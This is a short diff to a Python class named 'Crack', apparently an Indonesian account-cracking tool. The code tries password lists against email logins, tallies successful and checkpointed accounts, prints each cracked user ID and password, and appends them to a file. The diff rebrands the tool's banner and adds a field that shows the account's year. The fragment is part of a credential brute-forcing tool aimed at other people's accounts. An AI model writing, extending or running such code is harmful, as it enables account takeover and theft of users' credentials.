@@ -615,7 +615,7 @@ class Crack:
 							
 	###----------[ METODE API ]---------- ###
 	def metode_api(self,email,pwx):
-		prog.update(des,description=f" {H2}• {P2}[{H2}DensXyz{P2}] {P2}[{P2}{str(self.loop)}{P2}/{P2}{len(tampung)}{P2}]{P2} [OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}] [")
+		prog.update(des,description=f" {H2}• {P2}[{H2}NolepXx{P2}] {P2}[{P2}{str(self.loop)}{P2}/{P2}{len(tampung)}{P2}]{P2} [OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}] [")
 		prog.advance(des)
 		try:
 			for pw in pwx:
@@ -670,6 +670,7 @@ class Crack:
 						tree.add(Panel(f"{K2}   Checkpoint-Login{P2}",width=30,padding=(0,2),style=f"{color_cp}"))
 						tree.add(f"\r{P2}User ID {P2}     : {K2}{user}")
 						tree.add(f"{P2}Password {P2}    : {K2}{pw}")
+						tree.add(f"{P2}Cek-Tahun {P2}    : {K2}{tahun}")
 						tree.add(Panel(f"{K2}{ua}{P2}",width=83,padding=(0,2),style=f"{color_cp}"))
 						prints(tree)
 						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
